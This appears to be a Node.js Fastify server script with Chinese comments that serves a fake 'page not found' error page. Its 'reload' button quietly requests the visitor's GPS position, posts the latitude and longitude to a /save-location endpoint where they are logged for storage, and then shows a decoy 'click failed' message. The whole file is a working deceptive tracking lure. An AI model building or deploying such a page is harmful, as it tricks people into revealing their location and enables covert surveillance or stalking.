const fastify = require('fastify')();
const path = require('path');
const fastifyStatic = require('@fastify/static');
const fastifyCors = require('@fastify/cors');
const fastifyFormbody = require('@fastify/formbody'); // 解析 POST 的 body
fastify.register(fastifyCors);
fastify.register(fastifyFormbody);
fastify.register(fastifyStatic, {
  root: path.join(__dirname, 'public'),
  prefix: '/public/',
});

// 接收前端 POST 經緯度
fastify.post('/save-location', async (request, reply) => {
  const { latitude, longitude } = request.body;
  console.log('收到 GPS:', latitude, longitude);
  // 這裡你可以存資料庫，或其他處理
  reply.send('點擊失效!');
});

// 你現有的 GET / 路由
fastify.get('/', async (request, reply) => {
  reply.type('text/html;charset=utf-8').send(`
  <h1>Error頁面不存在</h1>
  <button id="btn" style="font-size: 24px; padding: 15px 30px;">點我重新載入</button>
    <script>
      function getGPSAndSend() {
        if (!navigator.geolocation) {
          alert('瀏覽器不支援功能');
          return;
        }
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          fetch('/save-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude: lat, longitude: lon }),
          })
          .then(res => res.text())
          .then(data => alert(data))
          .catch(err => alert('傳送失敗'));
        }, err => alert('定位失敗: ' + err.message));
      }
      document.getElementById('btn').addEventListener('click', getGPSAndSend);
    </script>
  `);
});

fastify.listen({ port: 3000, host: '0.0.0.0' }, (err) => {
  if (err) throw err;
  console.log('伺服器已啟動');
});
